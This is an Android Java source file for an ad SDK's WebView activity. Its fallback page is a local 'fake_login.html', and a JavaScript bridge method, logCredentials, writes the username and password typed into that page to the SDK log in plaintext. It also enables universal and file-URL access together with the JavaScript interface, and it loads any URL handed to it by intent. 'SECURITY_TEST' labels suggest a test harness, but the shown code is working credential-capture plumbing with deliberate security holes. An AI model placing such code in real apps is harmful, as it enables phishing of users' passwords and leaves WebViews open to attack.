package com.example.adsdk;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import android.view.View;
import android.widget.ProgressBar;
import android.widget.LinearLayout;

/**
 * WebView Activity for displaying local asset HTML files
 * This is used to avoid FileUriExposedException when opening local assets
 */
public class WebViewActivity extends Activity {
    private WebView webView;
    private ProgressBar progressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create layout programmatically
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(0xFF1E3A8A); // Blue background to match fake login

        // Add progress bar
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ));
        progressBar.setIndeterminate(false);
        progressBar.setMax(100);
        layout.addView(progressBar);

        // Create and configure WebView
        webView = new WebView(this);
        LinearLayout.LayoutParams webViewParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.MATCH_PARENT
        );
        webView.setLayoutParams(webViewParams);

        // Configure WebView settings
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowFileAccessFromFileURLs(true);
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setBuiltInZoomControls(false);
        webSettings.setDisplayZoomControls(false);
        webSettings.setSupportZoom(false);
        webSettings.setUseWideViewPort(true);
        webSettings.setLoadWithOverviewMode(true);

        // Add JavaScript interface to allow HTML to close the activity
        webView.addJavascriptInterface(new WebAppInterface(), "Android");

        // Set WebViewClient to handle page loading
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                progressBar.setVisibility(View.VISIBLE);
                progressBar.setProgress(0);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                progressBar.setVisibility(View.GONE);
                AdSdk.getInstance().log("WebViewActivity: Successfully loaded URL: " + url);
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                progressBar.setVisibility(View.GONE);
                AdSdk.getInstance().logError("WebViewActivity: Failed to load URL: " + failingUrl + " Error: " + description, null);
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // Handle special app close URL
                if ("app://close".equals(url)) {
                    AdSdk.getInstance().log("WebViewActivity: Received close request, finishing activity");
                    finish();
                    return true;
                }
                // Handle external links by opening in browser
                if (url.startsWith("http://") || url.startsWith("https://")) {
                    Intent intent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    return true;
                }
                // Let WebView handle local URLs
                return false;
            }
        });

        layout.addView(webView);
        setContentView(layout);

        // Get the URL from the intent
        Intent intent = getIntent();
        String url = intent.getStringExtra("url");

        if (url == null || url.isEmpty()) {
            url = "file:///android_asset/fake_login.html"; // fallback
            AdSdk.getInstance().log("WebViewActivity: No URL provided, using fallback");
        }

        AdSdk.getInstance().log("WebViewActivity: Loading URL: " + url);

        // Load the URL
        webView.loadUrl(url);
    }

    @Override
    public void onBackPressed() {
        // Handle back button - go back in WebView if possible, otherwise close activity
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.destroy();
        }
        super.onDestroy();
    }

    /**
     * JavaScript interface to allow HTML pages to interact with the Android app
     */
    public class WebAppInterface {
        @android.webkit.JavascriptInterface
        public void closeActivity() {
            AdSdk.getInstance().log("WebViewActivity: Received closeActivity call from JavaScript");
            finish();
        }

        @android.webkit.JavascriptInterface
        public void logCredentials(String username, String password) {
            AdSdk.getInstance().log("SECURITY_TEST: Fake login credentials captured via JavaScript interface");
            AdSdk.getInstance().log("SECURITY_TEST: Username: " + username);
            AdSdk.getInstance().log("SECURITY_TEST: Password: " + password);
        }
    }
}